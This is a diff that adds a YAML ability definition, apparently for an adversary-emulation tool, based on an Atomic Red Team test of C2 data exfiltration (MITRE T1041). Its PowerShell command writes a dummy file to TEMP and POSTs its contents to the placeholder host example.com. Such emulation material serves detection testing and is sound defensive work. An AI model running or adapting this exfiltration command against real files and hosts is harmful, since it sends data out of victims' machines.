@@ -1,0 +1,38 @@
+- id: d1253f6e-c29b-49dc-b466-2147a6191932
+  name: C2 Data Exfiltration
+  description: Exfiltrates a file present on the victim machine to the C2 server.
+  tactic: exfiltration
+  technique:
+    attack_id: T1041
+    name: Exfiltration Over C2 Channel
+  platforms:
+    windows:
+      psh:
+        command: if(-not (Test-Path $env:TEMP\LineNumbers.txt)){; 1..100 | ForEach-Object
+          { Add-Content -Path $env:TEMP\LineNumbers.txt -Value "This is line $_."
+          }; }; [System.Net.ServicePointManager]::Expect100Continue = $false; $filecontent
+          = Get-Content -Path $env:TEMP\LineNumbers.txt; Invoke-WebRequest -Uri example.com
+          -Method POST -Body $filecontent -DisableKeepAlive
+  plugin: atomic
+  singleton: false
+  repeatable: true
+  delete_payload: false
+  privilege: ''
+  buckets:
+  - exfiltration
+  - atomic-red-team
+  - t1041
+  author: Atomic Red Team
+  additional_info:
+    input_arguments:
+      destination_url:
+        description: Destination URL to post encoded data.
+        type: string
+        default: example.com
+      filepath:
+        description: The file which is being exfiltrated to the C2 Server.
+        type: path
+        default: $env:TEMP\LineNumbers.txt
+    technique_created: '2017-05-31T21:30:41.804Z'
+    atomic_guid: d1253f6e-c29b-49dc-b466-2147a6191932
+    import_timestamp: '2025-06-24T11:15:07.902570Z'
